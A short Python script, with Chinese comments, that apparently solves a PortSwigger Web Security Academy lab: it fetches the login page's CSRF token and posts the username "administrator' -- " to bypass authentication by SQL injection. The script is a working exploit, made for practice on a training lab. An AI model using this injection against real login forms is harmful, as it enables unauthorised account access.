## 此版本透過先get取得可用的csrf後再做POST
## 好像有用，還在測試中
## 測試登入成功直接破題

import requests
from typing import Optional

BASE_URL = "https://0a3f006903c1137781d72af3005a00d1.web-security-academy.net/login"

# Initialize session
session = requests.Session()

def send_post_request(url: str, data: dict, timeout: int = 10) -> Optional[requests.Response]:
    try:
        # Send POST request with form-urlencoded data
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = session.post(url, data=data, headers=headers, timeout=timeout)
        return response
    except requests.RequestException as e:
        print(f"Request failed: {str(e)}")
        return None

def fetch_csrf_token() -> Optional[str]:
    try:
        response = session.get(BASE_URL, timeout=10)
        if response.status_code == 200:
            # Extract CSRF token from the response (adjust based on actual HTML structure)
            # Example: Look for <input name="csrf" value="...">
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find('input', {'name': 'csrf'})
            if csrf_input and csrf_input.get('value'):
                return csrf_input.get('value')
        print(f"Failed to fetch CSRF token. Status: {response.status_code}")
        return None
    except requests.RequestException as e:
        print(f"Error fetching CSRF token: {str(e)}")
        return None

def main():
    # Fetch CSRF token dynamically
    csrf_token = fetch_csrf_token()
    if not csrf_token:
        print("Could not retrieve CSRF token. Exiting.")
        return

    # Define payload
    payload = {
        "csrf": csrf_token,
        "username": "administrator' -- ",
        "password": "d"
    }
    
    # Send the request
    response = send_post_request(BASE_URL, payload)
    
    # Check response
    if response:
        print(f"Status Code: {response.status_code}")
        print(f"Response Text: {response.text[:500]}")  # Print first 500 chars for brevity
        print(f"Response Length: {len(response.text)}")
        print(f"Response Headers: {response.headers}")
    else:
        print("Connection failed. No response received.")

if __name__ == "__main__":
    main()